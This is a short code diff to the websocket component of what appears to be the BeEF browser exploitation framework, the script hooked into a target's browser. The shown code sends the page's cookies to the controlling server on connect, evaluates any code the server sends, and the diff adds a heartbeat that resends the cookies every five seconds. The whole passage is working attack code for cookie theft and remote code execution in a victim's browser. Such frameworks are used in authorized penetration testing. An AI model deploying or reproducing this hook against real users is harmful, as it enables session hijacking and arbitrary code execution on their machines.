@@ -44,11 +44,11 @@ beef.websocket = {
             /*send browser id*/
             beef.websocket.send('{"cookie":"' + document.cookie + '"}');
             console.log("Connected and Helo");
+            beef.websocket.alive();
         }
         this.socket.onmessage = function (message) {
-            console.log("Received message via WS.");
-            //todo check message and send pong if ping req
-            eval(message.data);
+            console.log("Received message via WS."+ message.data);
+             eval(message.data);
         }
 
     },
@@ -56,6 +56,13 @@ beef.websocket = {
     send:function (data) {
         this.socket.send(data);
         console.log("Sent [" + data + "]");
+    },
+
+    alive: function (){
+        beef.websocket.send('{"alive":"'+document.cookie+'"}');
+        console.log("sent alive");
+        setTimeout("beef.websocket.alive()", 5000);
+
     }
 
 };
